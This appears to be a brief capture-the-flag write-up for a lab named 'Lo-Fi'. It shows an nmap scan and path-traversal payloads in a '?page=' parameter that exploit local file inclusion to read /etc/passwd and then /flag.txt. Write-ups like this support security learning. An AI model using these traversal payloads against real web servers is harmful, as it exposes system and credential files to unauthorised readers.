# Lo-Fi write-up

First we define the IP
```
IP=xx.xx.xxx.xxx
```
## Nmap Scan
I started analyzing the environment using __`nmap`__  to discover open ports 

```
nmap -sV -sC -oN nmap_scan $IP
```

> - `-sV`: Detect service/version
> - `-sC`: Run default scripts
> - `-oN`: Output to file (normal format)

We see that port `80 (HTTP)` is open

Let's try exploiting something here...

With
```
?page=/../../../../etc/passwd
```

Not good... but not bad either 
----
Let s try without the root directory first 


```
?page=../../../../etc/passwd
```

Perfect ðŸ‘‘
Now... where is the flag ? After some deep digging ... 2h ðŸ¥¹ I found it in 
```
?page=../../../../flag.txt
```

 ## Conclusion
- The web server was vulnerable to LFI.
- The flag was located in `/flag.txt`.
- Took around 2 hours to find the exact path.
